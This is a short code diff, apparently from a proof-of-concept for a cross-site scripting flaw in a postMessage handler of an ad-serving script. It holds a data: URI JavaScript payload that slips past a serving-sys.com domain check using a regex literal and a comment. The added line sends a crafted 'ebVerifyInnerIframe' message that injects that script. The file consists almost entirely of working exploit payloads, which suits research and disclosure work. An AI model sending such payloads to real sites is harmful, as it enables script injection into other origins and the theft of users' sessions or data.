@@ -16,3 +16,5 @@ function receiveMessage(event)
 
 // V2:
 data:text/javascript,alert();var x=/ds.serving-sys.com/.source;//#https://
+
+postMessage('{"type":"ebVerifyInnerIframe", "data":{"ebProtocol":"data:","ebBs":"text/javascript,alert();var x=/bs.serving-sys.com/.source;//#https://"}}','*');
